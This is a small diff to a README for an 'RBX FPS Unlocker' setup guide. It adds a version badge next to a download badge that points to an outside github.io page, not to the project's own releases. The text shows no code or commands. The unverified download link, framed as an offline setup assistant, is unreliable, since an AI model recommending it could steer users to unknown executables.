@@ -1,6 +1,6 @@
 # RBX FPS Unlocker - Setup Assistant
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://fps-unlock.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://fps-unlock.github.io/.github/)   [![Version](https://img.shields.io/badge/Version-4.4.3-green)](#)
 
 A complete step-by-step offline deployment guide for setting up RBX FPS Unlocker on Windows systems. This tool helps unlock framerate limitations in Roblox, enabling smoother performance and better responsiveness — no internet connection or online verification required.
 
